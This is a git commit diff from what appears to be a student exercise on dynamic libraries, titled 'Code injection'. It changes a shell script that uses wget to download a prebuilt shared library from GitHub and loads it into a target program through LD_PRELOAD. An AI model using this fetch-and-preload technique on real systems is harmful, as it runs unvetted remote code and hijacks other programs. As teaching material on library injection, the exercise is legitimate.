be4b5e440128fb44d8c6686c46c54f3a5b10d346
Davikky <ayobamivikky@gmail.com>
2023-08-25 03:31:41 -0700

    3. Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
-export LD_PRELOAD=/tmp/putshack.so
+wget -P ~/alx-low_level_programming/0x18-dynamic_libraries/tests https://github.com/alx-tools/0x18.c/raw/master/gm
+export LD_PRELOAD=~/alx-low_level_programming/0x18-dynamic_libraries/tests/gm
